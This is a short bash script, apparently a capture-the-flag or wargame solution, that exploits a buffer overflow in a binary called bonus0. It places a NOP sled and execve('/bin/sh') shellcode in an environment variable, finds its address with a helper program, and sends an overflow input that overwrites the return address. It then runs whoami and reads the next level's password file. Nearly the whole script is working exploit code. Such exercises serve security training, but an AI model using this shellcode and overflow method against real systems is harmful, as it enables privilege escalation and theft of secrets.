#!/bin/bash


gcc /tmp/getenv.c -o /tmp/getenv

function buildExploit {
    NOPSLED="'\x90' * 0xff"
    SHELLCODE="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
    export SHELLCODE=`python -c "print $NOPSLED + '$SHELLCODE'"`

    SH_BIGENDIAN_ADDR=`/tmp/getenv SHELLCODE ~/bonus`
    SH_LILENDIAN_ADDR=`python -c "import struct; print struct.pack('<L', int('$SH_BIGENDIAN_ADDR', 16))"`

    INPUT1="'A' * 4095 + '\n'"
    INPUT2="abcdefghi"$SH_LILENDIAN_ADDR"nopqrstuvwxyz"
    python -c "print $INPUT1 + '$INPUT2'" > /tmp/exploit10
}

set -x
(buildExploit && cat /tmp/exploit10 - | ~/bonus0) << EOI
    echo "\nwhoami: \$(whoami)"
    echo "Next pass is:  \$(cat /home/user/bonus1/.pass)\n"
EOI
